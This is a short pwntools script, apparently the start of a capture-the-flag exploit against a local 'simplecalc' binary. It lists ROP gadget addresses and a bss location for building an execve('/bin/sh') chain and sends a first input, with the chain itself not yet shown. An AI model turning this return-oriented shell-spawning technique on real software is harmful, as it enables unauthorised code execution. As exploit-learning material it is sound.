from pwn import *


elf = ELF("./simplecalc")
target = elf.process()

# need to write 12 ints as padding

# execve syscall: 59 (rax), fname(rdi), argv(rsi), envp(rdx)
popRax = p64(0x000000000044db34)
popRdi = p64(0x0000000000401b73)
popRsi = p64(0x0000000000401c87)
popRdx = p64(0x0000000000437a85)
syscall = p64(0x0000000000400488)

# write "/bin/sh" to memory
movGadget = p64(0x000000000044526e) # mov qword ptr [rax], rdx ; ret

# bss address
bss = p64(0x006c2c40)

log.info(target.clean())
target.sendline(b"100")
